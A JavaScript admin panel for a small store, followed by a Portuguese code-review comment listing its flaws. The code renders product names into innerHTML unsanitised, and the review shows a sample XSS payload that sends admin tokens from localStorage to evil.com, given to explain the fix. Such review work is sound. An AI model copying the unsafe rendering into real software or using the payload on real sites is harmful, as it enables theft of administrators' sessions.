// static/js/store-admin.js

if (!isLoggedIn()) {
  loginSection.style.display = 'block';
  adminSection.style.display = 'none';
} else {
  loginSection.style.display = 'none';
  adminSection.style.display = 'block';
  loadProducts();
}

// Login
document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
  e.preventDefault();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();

  try {
    await login(email, password);
    showToast('Login realizado!', 'success');
    loginSection.style.display = 'none';
    adminSection.style.display = 'block';
    loadProducts();
  } catch (err) {
    showToast(err.message, 'danger');
  }
});

// Carrega produtos
async function loadProducts() {
  try {
    const res = await fetch(`${API_BASE}/products`);
    if (!res.ok) throw new Error('Erro ao carregar');
    const { data } = await res.json();

    productsList.innerHTML = '';
    if (data.length === 0) {
      productsList.innerHTML = '<p>Nenhum produto cadastrado.</p>';
      return;
    }

    data.forEach(p => {
      const div = document.createElement('div');
      div.className = 'd-flex justify-content-between align-items-center mb-2 p-2 bg-secondary rounded';
      div.innerHTML = `
        <div>${p.name} - R$ ${p.price.toFixed(2)} - Estoque: ${p.stock}</div>
        <div>
          <button class="btn btn-sm btn-warning edit-btn" data-id="${p.id}">Editar</button>
          <button class="btn btn-sm btn-danger delete-btn" data-id="${p.id}">Excluir</button>
        </div>
      `;
      productsList.appendChild(div);
    });
  } catch (err) {
    showToast(err.message, 'danger');
  }
}

// Adicionar produto (usando modal)
document.getElementById('productForm')?.addEventListener('submit', async (e) => {
  e.preventDefault();
  const name = document.getElementById('productName').value.trim();
  const desc = document.getElementById('productDesc').value.trim();
  const price = parseFloat(document.getElementById('productPrice').value);
  const stock = parseInt(document.getElementById('productStock').value);

  if (!name || isNaN(price) || price <= 0 || isNaN(stock) || stock < 0) {
    showToast('Preencha corretamente', 'danger');
    return;
  }

  try {
    await fetch(`${API_BASE}/products`, {
      method: 'POST',
      body: JSON.stringify({ name, description: desc, price, stock })
    });
    showToast('Produto adicionado!', 'success');
    productForm.reset();
    loadProducts();
  } catch (err) {
    showToast(err.message, 'danger');
  }
});



/*


 Autorização apenas no frontend
javascriptif (!isLoggedIn()) {
    loginSection.style.display = 'block'
    adminSection.style.display = 'none'
}
Esconder a UI não protege nada — qualquer um pode chamar fetch('/api/products', {method: 'POST'}) diretamente. A proteção real está no RequireAdminRole do backend. Mas o frontend também deveria verificar se o usuário é admin, não apenas se está logado:
javascriptfunction isAdmin() {
    try {
        const payload = JSON.parse(atob(localStorage.getItem('token').split('.')[1]))
        return payload.role === 'admin'
    } catch { return false }
}

🔴 XSS via innerHTML com dados da API
javascriptdiv.innerHTML = `
    <div>${p.name} - R$ ${p.price.toFixed(2)} - Estoque: ${p.stock}</div>
p.name não sanitizado — um produto com nome <img onerror="fetch('https://evil.com?t='+localStorage.token)"> rouba tokens de todos os admins que abrirem o painel. Use textContent:
javascriptconst info = document.createElement('div')
info.textContent = `${p.name} - R$ ${p.price.toFixed(2)} - Estoque: ${p.stock}`

🔴 loginSection, adminSection, productsList, productForm não declarados
javascriptloginSection.style.display = 'block'  // variável não declarada
adminSection.style.display = 'none'
productsList.innerHTML = ''
Essas variáveis são globais implícitas que dependem de IDs no HTML — se o HTML mudar ou o script carregar antes do DOM, causa TypeError. Declare explicitamente:
javascriptconst loginSection = document.getElementById('loginSection')
const adminSection = document.getElementById('adminSection')
const productsList = document.getElementById('productsList')

🔴 fetch de criação de produto não verifica resposta
javascriptawait fetch(`${API_BASE}/products`, {
    method: 'POST',
    body: JSON.stringify({ name, description: desc, price, stock })
})
showToast('Produto adicionado!', 'success')  // sempre mostra sucesso
Se o servidor retornar 400 ou 500, o toast de sucesso aparece mesmo assim:
javascriptconst res = await fetch(`${API_BASE}/products`, { ... })
if (!res.ok) {
    const data = await res.json()
    throw new Error(data.error || 'Erro ao criar produto')
}
showToast('Produto adicionado!', 'success')

🟡 Botões de editar e deletar com data-id mas sem event listeners
javascript<button class="btn btn-sm btn-warning edit-btn" data-id="${p.id}">Editar</button>
<button class="btn btn-sm btn-danger delete-btn" data-id="${p.id}">Excluir</button>
Os botões são criados com data-id mas não há addEventListener para eles no arquivo — as ações de editar e deletar não funcionam. Provavelmente usa event delegation no HTML, mas não está visível aqui:
javascriptproductsList.addEventListener('click', (e) => {
    const id = e.target.dataset.id
    if (e.target.classList.contains('edit-btn')) editProduct(id)
    if (e.target.classList.contains('delete-btn')) deleteProduct(id)
})

🟡 password.value.trim() remove espaços de senha
javascriptconst password = document.getElementById('password').value.trim()
Senhas com espaços no início/fim são válidas — trim() as modifica silenciosamente, causando falha de login misteriosa.

🟡 Sem paginação na listagem de produtos
javascriptconst res = await fetch(`${API_BASE}/products`)
Sem ?limit= ou cursor — carrega todos os produtos de uma vez. Com muitos produtos, a página trava.

🟢 Upload de imagem não implementado
O painel admin não tem UI para upload de imagem apesar do endpoint existir no backend. Funcionalidade incompleta.


*/